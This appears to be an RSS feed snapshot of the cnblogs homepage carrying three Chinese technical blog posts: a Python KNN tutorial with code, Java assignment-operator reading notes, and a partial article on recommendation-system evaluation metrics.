<?xml version="1.0" encoding="utf-8"?>
<?xml-stylesheet type="text/xsl" href="css/feed.xsl"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:media="http://search.yahoo.com/mrss/" xmlns:og="http://ogp.me/ns#">
<channel>
<atom:link rel="self" href="http://192.168.1.4/fivefilters/makefulltextfeed.php?url=feed.cnblogs.com%2Fblog%2Fsitehome%2Frss&amp;max=10&amp;links=preserve&amp;exc=" />
<atom:link rel="alternate" title="Source URL" href="http://feed.cnblogs.com/blog/sitehome/rss" />
<atom:link rel="related" title="Subscribe to feed" href="http://www.subtome.com/#/subscribe?feeds=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dfeed.cnblogs.com%252Fblog%252Fsitehome%252Frss%26max%3D10%26links%3Dpreserve%26exc%3D&amp;back=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dfeed.cnblogs.com%252Fblog%252Fsitehome%252Frss%26max%3D10%26links%3Dpreserve%26exc%3D" />
<title>博客园_首页</title>
<link></link>
<description>代码改变世界</description>
<item>
<title>Python 实现 KNN（K-近邻）算法 - Max_Lyu</title>
<link>http://www.cnblogs.com/lyuzt/p/10471617.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/lyuzt/p/10471617.html</guid>
<description>
&lt;h2&gt;一、概述&lt;/h2&gt;
&lt;p&gt;　　KNN（K-最近邻）算法是相对比较简单的机器学习算法之一，它主要用于对事物进行分类。用比较官方的话来说就是：给定一个训练数据集，对新的输入实例，在训练数据集中找到与该实例最邻近的K个实例， 这K个实例的多数属于某个类，就把该输入实例分类到这个类中。为了更好地理解，通过一个简单的例子说明。&lt;/p&gt;
&lt;p&gt;　　我们有一组自拟的关于电影中镜头的数据：&lt;/p&gt;
&lt;p&gt;                         &lt;img src=&quot;https://img2018.cnblogs.com/blog/1458123/201903/1458123-20190304225959776-1524757039.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　那么问题来了，如果有一部电影 X，它的打戏为 3，吻戏为 2。那么这部电影应该属于哪一类？&lt;/p&gt;
&lt;p&gt;　　我们把所有数据通过图表显示出来（圆点代表的是自拟的数据，也称训练集；三角形代表的是 X 电影的数据，称为测试数据）：&lt;/p&gt;
&lt;p&gt;                                   &lt;img src=&quot;https://img2018.cnblogs.com/blog/1458123/201903/1458123-20190304220203111-673476942.png&quot; alt=&quot;&quot; width=&quot;433&quot; height=&quot;386&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　计算测试数据到训练数据之间的距离，假设 k 为 3，那么我们就找到距离中最小的三个点，假如 3 个点中有 2 个属于动作片，1 个属于爱情片，那么把该电影 X 分类为动作片。这种通过计算距离总结 k 个最邻近的类，按照”少数服从多数“原则分类的算法就为 KNN（K-近邻）算法。&lt;/p&gt;

&lt;h2&gt;二、算法介绍&lt;/h2&gt;
&lt;p&gt;　　还是以上面的数据为例，打戏数为 x，吻戏数为 y，通过欧式距离公式计算测试数据到训练数据的距离，我上中学那会儿不知道这个叫做欧式距离公式，一直用”两点间的距离公式“来称呼这个公式： &lt;img src=&quot;https://img2018.cnblogs.com/blog/1458123/201903/1458123-20190304225426690-906874238.png&quot; alt=&quot;&quot;/&gt;。但是现实中的很多数据都是多维的，即使如此，也还是按照这个思路进行计算，比如如果是三维的话，就在根号里面再加上 z 轴差的平方，即 &lt;img src=&quot;https://img2018.cnblogs.com/blog/1458123/201903/1458123-20190304230517991-136171368.png&quot; alt=&quot;&quot;/&gt;，以此类推。&lt;/p&gt;
&lt;p&gt;　　知道了这个计算公式，就可以计算各个距离了。我们以到最上面的点的距离为例：&lt;img src=&quot;https://img2018.cnblogs.com/blog/1458123/201903/1458123-20190304225205017-426074475.png&quot; alt=&quot;&quot;/&gt;，那么从上到下的距离分别是：&lt;img src=&quot;https://img2018.cnblogs.com/blog/1458123/201903/1458123-20190304225603424-80709055.png&quot; alt=&quot;&quot;/&gt;，&lt;img src=&quot;https://img2018.cnblogs.com/blog/1458123/201903/1458123-20190304230202766-1650691102.png&quot; alt=&quot;&quot;/&gt;，&lt;img src=&quot;https://img2018.cnblogs.com/blog/1458123/201903/1458123-20190304230212239-1671807566.png&quot; alt=&quot;&quot;/&gt;，&lt;img src=&quot;https://img2018.cnblogs.com/blog/1458123/201903/1458123-20190304230216424-1233936688.png&quot; alt=&quot;&quot;/&gt;。现在我们把 k 定为 3，那么距离最近的就是后面三个数了，在这三个数中，有两个属于动作片，因此，电影 X 就分类为动作片。&lt;/p&gt;

&lt;h2&gt;三、算法实现&lt;/h2&gt;
&lt;p&gt;　　知道了原理，那就可以用代码实现了，这里就不再赘述了，直接上带注释的 Python 代码：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;43&quot;&gt;
&lt;pre&gt;
&lt;span&gt;'''&lt;/span&gt;&lt;span&gt;
    trainData - 训练集
    testData - 测试集
    labels - 分类
&lt;/span&gt;&lt;span&gt;'''&lt;/span&gt;
&lt;span&gt;def&lt;/span&gt;&lt;span&gt; knn(trainData, testData, labels, k):
    &lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 计算训练样本的行数&lt;/span&gt;
    rowSize =&lt;span&gt; trainData.shape[0]
    &lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 计算训练样本和测试样本的差值&lt;/span&gt;
    diff = np.tile(testData, (rowSize, 1)) -&lt;span&gt; trainData
    &lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 计算差值的平方和&lt;/span&gt;
    sqrDiff = diff ** 2&lt;span&gt;
    sqrDiffSum &lt;/span&gt;= sqrDiff.sum(axis=1&lt;span&gt;)
    &lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 计算距离&lt;/span&gt;
    distances = sqrDiffSum ** 0.5
    &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 对所得的距离从低到高进行排序&lt;/span&gt;
    sortDistance =&lt;span&gt; distances.argsort()
    
    count &lt;/span&gt;=&lt;span&gt; {}
    
    &lt;/span&gt;&lt;span&gt;for&lt;/span&gt; i &lt;span&gt;in&lt;/span&gt;&lt;span&gt; range(k):
        vote &lt;/span&gt;=&lt;span&gt; labels[sortDistance[i]]
        count[vote] &lt;/span&gt;= count.get(vote, 0) + 1
    &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 对类别出现的频数从高到低进行排序&lt;/span&gt;
    sortCount = sorted(count.items(), key=operator.itemgetter(1), reverse=&lt;span&gt;True)
    
    &lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 返回出现频数最高的类别&lt;/span&gt;
    &lt;span&gt;return&lt;/span&gt; sortCount[0][0] 
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　ps：np.tile(testData, (rowSize, 1)) 是将 testData 这个数据扩展为 rowSize 列，这样能避免运算错误；&lt;/p&gt;
&lt;p&gt;　　　　sorted(count.items(), key=operator.itemgetter(1), reverse=True) 排序函数，里面的参数 key=operator.itemgetter(1), reverse=True 表示按照 count 这个字典的值（value）从高到低排序，如果把 1 换成 0，则是按字典的键（key）从高到低排序。把 True 换成 False 则是从低到高排序。&lt;/p&gt;

&lt;h2&gt; 四、测试与总结&lt;/h2&gt;
&lt;p&gt;　　用 Python 实现了算法之后，我们用上面的数据进行测试，看一下结果是否和我们预测的一样为动作片：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;47&quot;&gt;
&lt;pre&gt;
trainData = np.array([[5, 1], [4, 0], [1, 3], [0, 4&lt;span&gt;]])
labels &lt;/span&gt;= [&lt;span&gt;'&lt;/span&gt;&lt;span&gt;动作片&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;动作片&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;爱情片&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;爱情片&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;]
testData &lt;/span&gt;= [3, 2&lt;span&gt;]
X &lt;/span&gt;= knn(trainData, testData, labels, 3&lt;span&gt;)
&lt;/span&gt;&lt;span&gt;print&lt;/span&gt;(X)
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　执行这段代码后输出的结果为：动作片 。和预测的一样。当然通过这个算法分类的正确率不可能为 100%，可以通过增加修改数据测试，如果有大量多维的数据就更好了。&lt;/p&gt;

</description>
<pubDate>Mon, 04 Mar 2019 15:41:00 +0000</pubDate>
<dc:creator>Max_Lyu</dc:creator>
<og:description>一、概述 KNN（K-最近邻）算法是相对比较简单的机器学习算法之一，它主要用于对事物进行分类。用比较官方的话来说就是：给定一个训练数据集，对新的输入实例，在训练数据集中找到与该实例最邻近的K个实例，</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/lyuzt/p/10471617.html</dc:identifier>
</item>
<item>
<title>《Java编程思想》读书笔记-赋值操作符 - Lurker潜行者</title>
<link>http://www.cnblogs.com/lurker-yaojiang/p/10474126.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/lurker-yaojiang/p/10474126.html</guid>
<description>&lt;div class=&quot;markdown-here-wrapper&quot; data-md-url=&quot;https://i.cnblogs.com/EditPosts.aspx?opt=1&quot; readability=&quot;16.5&quot;&gt;
&lt;blockquote readability=&quot;6&quot;&gt;
&lt;p&gt;在最底层，Java中的数据是通过使用操作符来操作的。接下来我们逐一认识一些操作符。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;-&quot;&gt;怎么运用操作符&lt;/h3&gt;
&lt;p&gt;操作符接受一个或多个参数，并生成一个新值。&lt;/p&gt;
&lt;h3 id=&quot;-&quot;&gt;基本操作符&lt;/h3&gt;
&lt;h5 id=&quot;-&quot;&gt;赋值操作符&lt;/h5&gt;
&lt;p&gt;&lt;strong&gt;符号：&lt;/strong&gt;=&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;作用：&lt;/strong&gt;取右边的值，把它赋予给左边&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;注意事项：&lt;/strong&gt;&lt;/p&gt;
&lt;ol readability=&quot;-1&quot;&gt;&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;右值可以是任意常数、变量或表达式&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;左值必须是一个明确的、已命名的变量（已分配物理存储空间）&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;&lt;strong&gt;正确示例及说明：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;a=5;把5的值赋予a这个变量&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;错误示例及说明：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;5=5;左值是一个常量，不是一个变量，其指向的不是一块物理存储空间&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;赋值操作符作用于对象和基本数据类型的区别&lt;/strong&gt;&lt;/p&gt;
&lt;ol readability=&quot;2&quot;&gt;&lt;li readability=&quot;2&quot;&gt;
&lt;p&gt;作用于基本数据类型&lt;/p&gt;
&lt;p&gt;基本数据类型存储了一个实际的值，因此对基本数据类型采用赋值操作符的时候，实际上是执行了值的复制。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/hlx199802/picRepository/master/type1.png?raw=true&quot; alt=&quot;作用于基本数据类型&quot;/&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;2&quot;&gt;
&lt;p&gt;作用于对象（或者称引用数据类型）&lt;/p&gt;
&lt;p&gt;引用数据类型存储的是对象的引用，因此在对对象进行赋值操作时，实际上是执行了引用的复制，引用所指向的仍然是同一个对象。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/hlx199802/picRepository/master/reference1.png?raw=true&quot; alt=&quot;作用于引用数据类型&quot;/&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;​&lt;/p&gt;
&lt;/div&gt;
</description>
<pubDate>Mon, 04 Mar 2019 15:33:00 +0000</pubDate>
<dc:creator>Lurker潜行者</dc:creator>
<og:description>在最底层，Java中的数据是通过使用操作符来操作的。接下来我们逐一认识一些操作符。 怎么运用操作符 操作符接受一个或多个参数，并生成一个新值。 基本操作符 赋值操作符 符号：= 作用：取右边的值，把它</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/lurker-yaojiang/p/10474126.html</dc:identifier>
</item>
<item>
<title>推荐算法评测心得 - 胖喵~</title>
<link>http://www.cnblogs.com/by-dream/p/10450880.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/by-dream/p/10450880.html</guid>
<description>&lt;p&gt;   ◆&lt;strong&gt;版权声明：本文出自&lt;/strong&gt;胖喵~的博客，转载必须注明出处。&lt;/p&gt;
&lt;p&gt;    转载请注明出处：&lt;a id=&quot;Editor_Edit_hlEntryLink&quot; title=&quot;view: 推荐算法评测心得&quot; href=&quot;https://www.cnblogs.com/by-dream/p/10450880.html&quot; target=&quot;_blank&quot;&gt;https://www.cnblogs.com/by-dream/p/10450880.html&lt;/a&gt; &lt;em&gt;&lt;a href=&quot;http://www.cnblogs.com/by-dream/p/5195121.html&quot; target=&quot;_blank&quot;&gt;&lt;br/&gt;&lt;/a&gt;&lt;/em&gt;&lt;/p&gt;


&lt;p&gt;在taobao做推荐算法的质量工作将近一年，这一年尝试了很多东西，踩了不少坑，也对推荐的评测工作稍微有了些自己的心得，现在分享出来，希望能和做这块工作的同学一起交流、探讨，也欢迎多拍砖，多提意见。&lt;/p&gt;

&lt;h3 id=&quot;3f981012&quot;&gt;推荐系统&lt;/h3&gt;
&lt;p&gt;&lt;span data-key=&quot;297&quot;&gt;目前推荐技术的应用已经非常较普及了，新闻、商品、问答、音乐，几乎都会用到推荐算法来为你呈现内容。下面是淘宝、知乎、微博三个app的推荐模型，可以看到推荐都在非常重要的位置。&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;bi-unstyle bi-dnd&quot; data-key=&quot;296&quot;&gt;&lt;span data-key=&quot;297&quot;&gt;&lt;span data-key=&quot;297&quot;&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/626346/201903/626346-20190304232544280-1048761353.png&quot; alt=&quot;&quot; width=&quot;590&quot; height=&quot;442&quot;/&gt;&lt;/span&gt;&lt;/span&gt;&lt;/div&gt;


&lt;p&gt;&lt;span data-key=&quot;297&quot;&gt;在介绍推荐算法评测之前，我先简单说下推荐系统，这里我以商品为例，&lt;/span&gt;简单描述下推流程，让大家更明白一些，一般推荐主要包含以下步骤：&lt;/p&gt;
&lt;h4 id=&quot;9702925b&quot;&gt;召回-&amp;gt;打分排序-&amp;gt;透出&lt;/h4&gt;
&lt;p&gt;&lt;strong&gt;召回&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;召回阶段通常的手段是协同过滤比较场景的i2i,u2i等这种x2x，也有使用embedding的方式通过向量之间的距离进行召回。以i2i为例，假如现在要针对我推荐一个商品，那么首先要找到我感兴趣的物品 ，这些数据是通过我的历史行为来进行获取，比如拿到我最近一段时间内的点击、加购、收藏、购买的物品，将这些商品做为trigger进行召回，协同算法的具体就不再这里叙述了，有兴趣可以看下链接，最终我们按照协同过滤算法算出商品之间的相似分值，然后按照一定数量进行截断，因为这里截断也是依靠分数来进行的，所以一般这一步也称粗排。这样召回截断就完成了。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;打分&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;召回完商品后，我们需要对这些商品进行再一次的精排，这里需要用模型来预估ctr，一般情况下LR、GBDT、FM用的比较多，这里深度网络相对用的少，主要为了考虑到性能，尤其是rt，因为绝大部分的精排都是需要实时预测的，所有对耗时有一定的要求。继续说下模型预测的步骤，首先针对召回的商品进行特征的补充，例如该商品的一级类目、叶子类目（一级类目代表比较，叶子类目代表最细分的类目）、被多少用户购买等，然后再加入人的特征，例如性别、年龄、收入、对类目的偏好等，然后将这些信息做为feature，用模型进行预测，然后根据模型预测的结果进行排序，输出。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;模型&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;打分过程中的模型是需要提前训练和部署，训练集的来源就是用户的实时行为加上用户和商品的特征。feature的构成是用户的特征和商品的特征，label则是用户是否点击了该商品。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/626346/201903/626346-20190304145109663-2131498440.png&quot; alt=&quot;&quot; width=&quot;500&quot; height=&quot;390&quot;/&gt; &lt;/p&gt;
&lt;h3 id=&quot;3f981012&quot;&gt;质量方案&lt;/h3&gt;
&lt;p&gt;接下来说下如何保证这块的质量。由于推荐系统最终对用户需要提供实时的服务化，因此免不了有工程端的技术需要一起配合。因此我这块主要分为两个维度来开展，一方面是工程端的质量保证，一方面是算法侧的质量保证。&lt;/p&gt;
&lt;p&gt;工程端质量&lt;/p&gt;
&lt;p&gt;这一块可以将算法当成一个黑盒子，只把他当成一个有结果返回的接口。针对这方面前人已经有了丰富的经验，我们可以做接口的单元测试和冒烟测试，另外就是压测，在预估的qps下看rt是否满足业务方的要求，load是否过大，超时和错误的比例是否符合一定的预期。这里就不细说了，重点说说第二部分。&lt;/p&gt;
&lt;p&gt;算法端质量&lt;/p&gt;
&lt;p&gt;这里我再进行细分一下，分为三部分介绍：算法数据、算法模型、算法效果；&lt;/p&gt;
&lt;p&gt;算法数据：&lt;/p&gt;
&lt;p&gt;大家都知道算法在做训练前数据的处理部分非常的重要，有兴趣可以看下特征工程相关的内容，数据的来源，特征的构造，数据抽取、加工整个的过程都有可能会出现错误，而且数据一般都是存储在分布式系统数据库里，因此需要借助类似hive这样的工具将sql转换成MapReduce的任务去进行离线的计算，离线任务的产出通常会耗费不少的时间，而对于一些日更新的模型通过对数据对产出时间有一定的要求。因此数据这块最主要的保证点为：数据本身的质量，和数据的产出时间。数据本身的质量一般可以通过数据大小的整体抖动，以及关键字段是否为空，主键是否重复，做法比较简单可以通过简单sql或者udf来完成，然后借助工程能力做到预警、检查、出报表等。&lt;/p&gt;
&lt;p&gt;算法模型：&lt;/p&gt;
&lt;p&gt;模型的本身在迭代过程中也是需要关注的，不过通常算法同学的训练优化也是参考这些指标，所以我们也可以把这几个指标做为模型本身好坏的评估。具体为：准确率、召回率、AUC。&lt;/p&gt;
&lt;p&gt;算法效果：&lt;/p&gt;
&lt;p&gt;那么这个算法推荐出的效果究竟好不好呢，这个是一个非常主观的事情，每个人的感受也不是一样的，但是我们仍然要衡量它的好坏，这里我参考业内学者的推荐书籍以及自己的一些摸索，总结出下面一些方法，供大家参考。&lt;/p&gt;
&lt;p&gt;人工评测：&lt;/p&gt;
&lt;p&gt;顾名思义，邀请一帮人来对你的推荐系统的结果进行评测。这里想法来自于我在做翻译评测时期的经验，首先这个成本比较高，另外就是参杂了人的主观性非常的高，翻译的好坏我们可以通过制定一些细致的规则来进行约束，但是推荐的好坏我们却不好制定详细的规则，另外就是推荐之前的用户行为如何模拟，如何让评测者进行感知，这些都是比较难的，并且和基准的对比也不是很好做，所以这里不是很推荐用这个方法，但是还是要提一下。&lt;/p&gt;
&lt;p&gt;指标评估：&lt;/p&gt;
&lt;p&gt;指标化推荐结果，也就是将推荐的结果用不同的指标来进行说明，通过这些指标，你可以更加的了解你的推荐系统，部分指标不一定越高越好，但是你需要让它保持在一定的范围内。说到具体的例子的时候，我会提一下。下面我们看下这些指标。&lt;/p&gt;
&lt;h3 id=&quot;tyzydf&quot; class=&quot;bi-heading bi-heading-three bi-dnd&quot; data-key=&quot;40&quot; data-id=&quot;tyzydf&quot;&gt;&lt;span data-key=&quot;41&quot;&gt;覆盖率&lt;/span&gt;&lt;/h3&gt;
&lt;div class=&quot;bi-indent bi-indent-0&quot; data-key=&quot;42&quot; readability=&quot;6&quot;&gt;
&lt;p&gt;&lt;span data-key=&quot;46&quot;&gt;定义：&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;bi-unstyle bi-dnd&quot; data-key=&quot;45&quot; readability=&quot;7&quot;&gt;&lt;span data-key=&quot;46&quot;&gt;&lt;span data-key=&quot;46&quot;&gt;推荐系统能够推荐出来的“商品/类目”占“总商品/类目”集合的比例。假设系统的用户集合为U，推荐系统给每个用户推荐一个长度为N的物品列表R(u) ，总物品为N。那么：&lt;/span&gt;&lt;/span&gt;
&lt;p&gt;覆盖率 =  &lt;span&gt;&lt;strong&gt;$\frac{\Sigma R(u)}{N}$&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;

&lt;div class=&quot;bi-indent bi-indent-0&quot; data-key=&quot;53&quot; readability=&quot;12&quot;&gt;
&lt;p&gt;&lt;span data-key=&quot;55&quot;&gt;描述推荐结系统对物品长尾发掘能力；&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span data-key=&quot;55&quot;&gt;举个例子，淘宝上商品千千万万，推荐系统能否保证让新的一些商品有足够的机会曝光出去呢？还是有些商品永远都无法得到推荐曝光的机会。这个指标反应的就是这个情况，显然物品的覆盖率是达不到100%的，但是我们可以看类目的覆盖率来进行衡量，假设全网所有的一级大类目一共2千个（和全网上亿的物品相比非常的少），那么推荐系统一天之内推荐出去的商品对应的一级类目，这个就是我们要衡量的标准。如果覆盖率达不到100%，那么肯定是有问题的。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;
&lt;h3 id=&quot;tyzydf&quot; class=&quot;bi-heading bi-heading-three bi-dnd&quot; data-key=&quot;40&quot; data-id=&quot;tyzydf&quot;&gt;&lt;span data-key=&quot;41&quot;&gt;基尼系数&lt;/span&gt;&lt;/h3&gt;
&lt;/p&gt;
&lt;/div&gt;
&lt;div class=&quot;bi-indent bi-indent-0&quot; data-key=&quot;56&quot; readability=&quot;10&quot;&gt;
&lt;p&gt;&lt;span data-key=&quot;58&quot;&gt;覆盖率反应出的分布情况是比较有限的，我们只能知道哪些类目覆盖了，哪些没有覆盖，那类目之间究竟哪个类目占的多，哪个类目占的少呢？为了更细致地描述推荐系统发掘长尾的能力，我们需要统计推荐列表中不同类目出现次数的分布，引入基尼系数来评价。&lt;/span&gt;&lt;/p&gt;
&lt;/div&gt;
&lt;div class=&quot;bi-indent bi-indent-0&quot; data-key=&quot;59&quot; readability=&quot;8&quot;&gt;
&lt;p&gt;&lt;span data-key=&quot;61&quot;&gt;基尼系数：按照类目的流行度（曝光次数）从大到小排序后进行统计后进行洛伦茨曲线的绘制。&lt;/span&gt;&lt;/p&gt;
&lt;/div&gt;
&lt;div class=&quot;bi-indent bi-indent-0&quot; data-key=&quot;62&quot; readability=&quot;8&quot;&gt;
&lt;p&gt;&lt;span data-key=&quot;64&quot;&gt;做法：&lt;/span&gt;&lt;span data-key=&quot;67&quot;&gt;以类目分布基尼系数为例，算出所有的类目被曝光的次数，需要以天周期为单位进行数据的统计。&lt;/span&gt;&lt;/p&gt;
&lt;/div&gt;
&lt;div class=&quot;bi-indent bi-indent-0&quot; data-key=&quot;68&quot; readability=&quot;10&quot;&gt;
&lt;div class=&quot;bi-unstyle bi-dnd&quot; data-key=&quot;69&quot;&gt;&lt;span data-key=&quot;70&quot;&gt;&lt;img class=&quot;image&quot; src=&quot;https://cdn.nlark.com/lark/0/2018/png/96011/1533808151065-dfd5e5c9-b682-4eb7-9364-f70cbdfdc476.png&quot; alt=&quot;&quot; width=&quot;449&quot; height=&quot;257&quot;/&gt;&lt;/span&gt;&lt;/div&gt;

&lt;p&gt;&lt;span data-key=&quot;70&quot;&gt;这里需要说明一下，基尼系数越大代表所有类目的分布越不均匀，系数越小代表类目分布越均匀。我们知道，每个电商网站都有其侧重的类目，因此绝对平均不是一件好事，头部的类目占比稍多一些但是不能太离谱，举个例子100个类目，前5个占比到30～40%是相对比较好的。当然绝对的只看这个数据意义也不是很大，更多的是长期对这个指标进行监控，看是否会发生大的变动。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;
&lt;h3 id=&quot;tyzydf&quot; class=&quot;bi-heading bi-heading-three bi-dnd&quot; data-key=&quot;40&quot; data-id=&quot;tyzydf&quot;&gt;&lt;span data-key=&quot;41&quot;&gt;打散度&lt;/span&gt;&lt;/h3&gt;
&lt;/p&gt;
&lt;/div&gt;
&lt;p&gt;定义：描述推荐结果中结果数据的分散程度。&lt;/p&gt;
&lt;div data-type=&quot;alignment&quot; data-value=&quot;center&quot; readability=&quot;13&quot;&gt;
&lt;p&gt;打散度 = &lt;span&gt;$\frac{2}{k(k-1)} \sum\limits_{i\neq j}^{k} 0.85^{dis((i,j)-1) * sim(i,j)}  $&lt;/span&gt; (dis(i,j) = |i-j|,sim(i,j) 为 i==j?1!0)&lt;/p&gt;
&lt;/div&gt;
&lt;div data-type=&quot;indent&quot; data-value=&quot;0&quot; readability=&quot;14&quot;&gt;
&lt;p&gt;这里需要解释一下，这里首先是对两两物品（不同的位置）计算为打散度后，得出整体的打散度。相似函数sim代表两两是否相同，相同则为1，不相似则为0。关于两个内容之间距离对打散度的影响，不能是线性的关系，因为随着两个商品出现的位置越来越大，用户对重复商品的感受会逐渐的减弱（很近的位置就有两个相似的内容觉得会有些重复，但是如果比较远的位置有两个相似的一般是可以接受的），一般双列流屏幕出现内容大概是4个，0.85^(5-1) 大概在 0.5左右，所以如果是5以内，则打散度会很低，但是如果&amp;gt;5了，打散度就不会衰减的比较厉害了。 相似的两个物品越靠近，权重越大。&lt;/p&gt;
&lt;div data-type=&quot;p&quot; readability=&quot;17.5&quot;&gt;

&lt;p&gt;定义：描述推荐系统不断迭代过程中推荐结果变化程度的指标。&lt;/p&gt;
&lt;p&gt;更新率 = 1 - &lt;span&gt;$\frac{S_{昨日}  ∩  S_{昨日}}{S_{昨日}  ∪  S_{昨日}}$&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;上面公式还是以类目为例，$S_{昨日}$代表昨天一天出现的所有商品所在的类目的个数，然后两天的交集除以并集，计算得出推荐出商品所属类目的更新率。&lt;/p&gt;
&lt;h3 id=&quot;4ew7ct&quot; class=&quot;bi-heading bi-heading-three bi-dnd&quot; data-key=&quot;2&quot; data-id=&quot;4ew7ct&quot;&gt;&lt;span data-key=&quot;3&quot;&gt;发现性&lt;/span&gt;&lt;/h3&gt;
&lt;div class=&quot;bi-indent bi-indent-0&quot; data-key=&quot;4&quot; readability=&quot;7&quot;&gt;
&lt;p&gt;&lt;span data-key=&quot;6&quot;&gt;定义：推荐系统对用户未产生过关系的商品的发现能力。&lt;/span&gt;&lt;/p&gt;
&lt;/div&gt;
&lt;div class=&quot;bi-indent bi-indent-0&quot; data-key=&quot;7&quot; readability=&quot;14.5&quot;&gt;
&lt;p&gt;&lt;span data-key=&quot;9&quot;&gt;在全网商品中，可能有一些比较好的商品，但是用户从来都没有点击过类似的物品，这时候推荐系统推荐给用户的时候，用户很有可能会眼前一亮，满满惊喜。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span data-key=&quot;9&quot;&gt;&lt;span data-key=&quot;9&quot;&gt;发现性 = &lt;span&gt;$\frac{1}{n} \sum\limits_{i=1}^{n}  \frac{ S_{今日点击（前一周未点击）}  }{  S_{前一周点击}}$&lt;/span&gt;  &lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;bi-unstyle bi-dnd&quot; data-key=&quot;8&quot; readability=&quot;10&quot;&gt;
&lt;p&gt;&lt;span data-key=&quot;9&quot;&gt;同样以类目为例，今天我点击了一个我感兴趣的商品，而这个商品的类似恰恰是我前一周都没有点击过过的内容，这就说明推荐系统的为我推荐了一个我之前都没有关注过并且我感兴趣的内容，也就是系统的发现性，在算出每个人的值之后，再进行求平均计算。&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;bi-unstyle bi-dnd&quot; data-key=&quot;193&quot; readability=&quot;17.5&quot;&gt;
&lt;h3 id=&quot;icp3cp&quot; class=&quot;bi-heading bi-heading-three bi-dnd&quot; data-key=&quot;152&quot; data-id=&quot;icp3cp&quot;&gt;上新率&lt;/h3&gt;
&lt;div class=&quot;bi-indent bi-indent-0&quot; data-key=&quot;168&quot; readability=&quot;11&quot;&gt;
&lt;p&gt;&lt;span data-key=&quot;173&quot;&gt;定义： 新内容被推荐系统推荐的曝光情况，这里可以从两个维度产出这项指标。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span data-key=&quot;173&quot;&gt;上新率1 = &lt;span&gt;$\frac{当日曝光的内容中内容为最近一周生产的内容数}{当日曝光内容数} $&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;/div&gt;
&lt;div class=&quot;bi-alignment bi-alignment-center&quot; data-key=&quot;174&quot;&gt;
&lt;div class=&quot;bi-unstyle bi-dnd&quot; data-key=&quot;175&quot; readability=&quot;9&quot;&gt;
&lt;div class=&quot;bi-indent bi-indent-0&quot; data-key=&quot;168&quot; readability=&quot;13&quot;&gt;
&lt;p&gt;&lt;span data-key=&quot;173&quot;&gt;上新率2 = &lt;span&gt;$\frac{当日曝光的内容中内容为最近一周生产的内容数}{最近一周生产的内容数} $&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
